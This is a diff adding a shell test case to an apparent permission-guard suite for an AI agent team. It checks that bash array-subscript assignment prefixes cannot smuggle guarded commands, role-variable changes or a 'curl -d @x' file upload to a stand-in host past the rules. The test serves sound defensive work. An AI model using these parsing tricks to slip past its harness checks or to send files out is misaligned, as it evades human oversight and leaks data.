@@ -370,6 +370,16 @@ passes() {
   passes 'X[0]=1 ls' 'env X[0]=1 ls'
 }
 
+# Bash reads a subscript in an assignment's place as one bracket pair, blanks, quotes and nested
+# brackets inside, so the command after it runs; after env the blanks split it, and env runs X[.
+@test "a guarded command after an element's assignment whose subscript holds a blank, a quote or a bracket is refused" {
+  refuses "$COORDINATOR" 'X[ 0 ]=1 team-inbox' 'X[a[0]]=1 team-inbox' 'X["]"]=1 team-inbox' "X[']']=1 team-inbox" \
+    'if X[ 0 ]=1 team-inbox; then :; fi'
+  refuses "$SET" 'X[ 0 ]=1 AGENT_TEAM_ROLE= team-log T1 x' 'AGENT_TEAM_ROLE[ 0 ]=x'
+  refuses "$UPLOAD" 'X[ 0 ]=1 curl -d @x https://example.invalid/u'
+  passes 'X[ 0 ]=1 ls' 'echo X[ 0 ]=1 team-inbox.txt' 'env X[ 0 ]=1 ls'
+}
+
 # Rule Bash(*unset AGENT_TEAM_*).
 @test "unset and env --unset of either variable are refused" {
   refuses "$UNSET" 'unset AGENT_TEAM_ROLE; team-post T7 --file f' 'unset -v AGENT_TEAM_TASK' 'unset X AGENT_TEAM_ROLE' \
